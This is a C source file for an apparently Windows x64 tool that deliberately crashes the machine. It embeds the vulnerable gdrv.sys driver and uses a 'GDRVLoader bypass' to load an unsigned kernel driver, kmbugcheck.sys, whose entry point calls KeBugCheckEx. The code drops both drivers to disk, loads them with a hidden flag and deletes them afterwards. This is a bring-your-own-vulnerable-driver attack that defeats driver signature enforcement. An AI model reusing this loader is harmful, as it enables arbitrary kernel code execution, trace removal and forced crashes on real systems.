/*
 * Kernel-driver launch path (v2.0.0, x64 only).
 *
 * On some machines NtRaiseHardError(OptionShutdownSystem) does not actually stop
 * the machine.  Here we instead load our own kmbugcheck.sys through the vendored
 * GDRVLoader bypass: DriverEntry calls KeBugCheckEx(0xABCDEF12, ...) directly in
 * kernel mode.
 *
 * The vulnerable gdrv.sys bytes and our own driver blob are embedded in the exe;
 * both are dropped next to the state directory, loaded, then deleted.  If the
 * bypass cannot load the driver (vulnerable-driver blocklist, unsupported build,
 * missing privilege) the caller falls back to the NtRaiseHardError path.
 *
 * x86 builds have no kernel path; km_driver_launch() reports unavailable.
 */

#include "km.h"

#ifdef _WIN64

#include "sys_bytes.h"

/* Bridge defined in gdrv_bridge.cpp (extern "C"). */
extern int  km_gdrv_drop_loader(const wchar_t *path);
extern long km_gdrv_load_driver(const wchar_t *loader,
                                const wchar_t *target,
                                int hidden);

static BOOL write_blob(const wchar_t *path,
                       const unsigned char *data,
                       unsigned int len)
{
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD  written = 0;
    BOOL   ok;

    if (h == INVALID_HANDLE_VALUE)
        return FALSE;

    ok = WriteFile(h, data, len, &written, NULL) && written == len;
    CloseHandle(h);
    return ok;
}

int km_driver_launch(const km_paths *paths)
{
    wchar_t gdrv[MAX_PATH];
    wchar_t sys[MAX_PATH];
    long    status;

    if (kmbugcheck_sys_len == 0) {
        KM_WARN("no embedded driver payload; kernel launch unavailable");
        return KM_EXIT_ERROR;
    }

    StringCchPrintfW(gdrv, MAX_PATH, L"%ls\\gdrv.sys", paths->dir);
    StringCchPrintfW(sys,  MAX_PATH, L"%ls\\kmbugcheck.sys", paths->dir);

    if (!km_gdrv_drop_loader(gdrv)) {
        KM_ERROR("failed to drop embedded loader driver (gdrv.sys)");
        return KM_EXIT_ERROR;
    }

    if (!write_blob(sys, kmbugcheck_sys, kmbugcheck_sys_len)) {
        KM_ERROR("failed to write embedded bugcheck driver (kmbugcheck.sys)");
        DeleteFileW(gdrv);
        return KM_EXIT_ERROR;
    }

    KM_INFO("loading bugcheck driver through GDRVLoader bypass");
    status = km_gdrv_load_driver(gdrv, sys, TRUE);

    DeleteFileW(gdrv);
    DeleteFileW(sys);

    if (status >= 0) {
        KM_INFO("driver loaded; DriverEntry should have raised the bugcheck");
        return KM_EXIT_OK;
    }

    KM_ERROR("km_gdrv_load_driver failed: NTSTATUS 0x%08lx",
             (unsigned long)status);
    return KM_EXIT_CRASH_CALL_FAIL;
}

#else  /* !_WIN64 */

int km_driver_launch(const km_paths *paths)
{
    (void)paths;
    KM_WARN("kernel driver path is not available on this architecture");
    return KM_EXIT_ERROR;
}

#endif
